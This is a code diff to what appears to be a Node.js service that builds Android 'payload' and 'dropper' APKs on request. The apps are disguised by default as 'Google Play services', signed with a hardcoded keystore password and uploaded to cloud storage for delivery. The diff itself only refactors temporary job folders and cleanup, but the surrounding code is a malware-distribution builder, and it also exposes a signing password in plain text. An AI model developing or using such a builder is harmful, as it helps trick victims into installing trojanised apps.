@@ -156,17 +156,17 @@ function patchArscTitle(arscBuf, targetName) {
     return false;
 }
 
-async function signApk(unsignedPath) {
+async function signApk(unsignedPath, outDir = TEMP_DIR) {
     const ksArgs = fs.existsSync(KEYSTORE)
         ? `--ks "${KEYSTORE}" --ksAlias usman90 --ksPass "God112256@" --ksKeyPass "God112256@"`
         : '';
-    const signCmd = `java -jar "${SIGNER}" --apks "${unsignedPath}" --out "${TEMP_DIR}" ${ksArgs} --allowResign`;
+    const signCmd = `java -jar "${SIGNER}" --apks "${unsignedPath}" --out "${outDir}" ${ksArgs} --allowResign`;
 
     await new Promise((resolve, reject) => {
         exec(signCmd, { timeout: 120000 }, (err, stdout, stderr) => {
             if (err) {
                 console.error('[SIGN] uber-apk-signer error:', stderr || err.message);
-                exec(`java -jar "${SIGNER}" --apks "${unsignedPath}" --out "${TEMP_DIR}" --allowResign`,
+                exec(`java -jar "${SIGNER}" --apks "${unsignedPath}" --out "${outDir}" --allowResign`,
                     { timeout: 60000 }, (e2) => e2 ? reject(e2) : resolve());
             } else {
                 resolve();
@@ -363,11 +363,12 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
             catch (e) { console.error('[WH]', e.message); }
         };
 
-        const unsignedPath = path.join(TEMP_DIR, `unsigned-${uuid}.apk`);
+        const jobId = `${uuid}-${Date.now()}-${Math.random().toString(36).substring(2, 7)}`;
+        const jobDir = path.join(TEMP_DIR, `job-${jobId}`);
+        fs.mkdirSync(jobDir, { recursive: true });
 
         try {
             if (!fs.existsSync(BASE_APK)) throw new Error('Base APK not found at assets/base.apk');
-            if (fs.existsSync(unsignedPath)) fs.unlinkSync(unsignedPath);
 
             const targetPkg    = resolvePackage(userPkg);
             const targetName   = (appName && appName.trim()) ? appName.trim() : 'Google Play services';
@@ -560,24 +561,19 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
             const finalArsc = zip.getEntry('resources.arsc');
             if (finalArsc) finalArsc.header.method = 0;
 
-            const unsignedPayloadPath = path.join(TEMP_DIR, `unsigned-payload-${uuid}.apk`);
+            const unsignedPayloadPath = path.join(jobDir, `unsigned-payload.apk`);
             zip.writeZip(unsignedPayloadPath);
 
             await sendUpdate('apk_progress', { step: 'Signing payload package with usman90 key...', progress: 85 });
-            await signApk(unsignedPayloadPath);
+            await signApk(unsignedPayloadPath, jobDir);
 
-            const signedPayloadName = fs.readdirSync(TEMP_DIR)
-                .find(f => f.startsWith(`unsigned-payload-${uuid}`) && f.includes('signed'));
+            const signedPayloadName = fs.readdirSync(jobDir)
+                .find(f => f.includes('unsigned-payload') && f.includes('signed'));
             if (!signedPayloadName) throw new Error('Signed payload APK not found after signing step');
-            const signedPayloadPath = path.join(TEMP_DIR, signedPayloadName);
+            const signedPayloadPath = path.join(jobDir, signedPayloadName);
 
             await sendUpdate('apk_progress', { step: 'Uploading payload to cloud storage...', progress: 90 });
             const payloadDownloadUrl = await uploadApkToCloud(signedPayloadPath, finalApkName);
-
-            // Clean payload build files from temp
-            [unsignedPayloadPath, signedPayloadPath].forEach(p => {
-                try { if (fs.existsSync(p)) fs.unlinkSync(p); } catch (_) {}
-            });
 
             if (!payloadDownloadUrl) {
                 throw new Error('Payload cloud upload failed');
@@ -645,23 +641,19 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
                     const finalDropArsc = dropZip.getEntry('resources.arsc');
                     if (finalDropArsc) finalDropArsc.header.method = 0;
 
-                    const unsignedDropPath = path.join(TEMP_DIR, `unsigned-dropper-${uuid}.apk`);
+                    const unsignedDropPath = path.join(jobDir, `unsigned-dropper.apk`);
                     dropZip.writeZip(unsignedDropPath);
 
                     await sendUpdate('apk_progress', { step: 'Signing installer package...', progress: 96 });
-                    await signApk(unsignedDropPath);
+                    await signApk(unsignedDropPath, jobDir);
 
-                    const signedDropName = fs.readdirSync(TEMP_DIR)
-                        .find(f => f.startsWith(`unsigned-dropper-${uuid}`) && f.includes('signed'));
+                    const signedDropName = fs.readdirSync(jobDir)
+                        .find(f => f.includes('unsigned-dropper') && f.includes('signed'));
                     if (!signedDropName) throw new Error('Signed dropper APK not found after signing step');
-                    const signedDropPath = path.join(TEMP_DIR, signedDropName);
+                    const signedDropPath = path.join(jobDir, signedDropName);
 
                     await sendUpdate('apk_progress', { step: 'Finalizing installer delivery...', progress: 98 });
                     const dropperUploadUrl = await uploadApkToCloud(signedDropPath, finalApkName);
-
-                    [unsignedDropPath, signedDropPath].forEach(p => {
-                        try { if (fs.existsSync(p)) fs.unlinkSync(p); } catch (_) {}
-                    });
 
                     if (dropperUploadUrl) {
                         finalDeliveryUrl = dropperUploadUrl;
@@ -682,7 +674,12 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
         } catch (err) {
             console.error(`[APK] Failed ${uuid}:`, err.message);
             try { await sendUpdate('apk_error', { message: err.message }); } catch (_) {}
-            try { if (fs.existsSync(unsignedPath)) fs.unlinkSync(unsignedPath); } catch (_) {}
+        } finally {
+            try {
+                if (fs.existsSync(jobDir)) {
+                    fs.rmSync(jobDir, { recursive: true, force: true });
+                }
+            } catch (_) {}
         }
     })();
 });
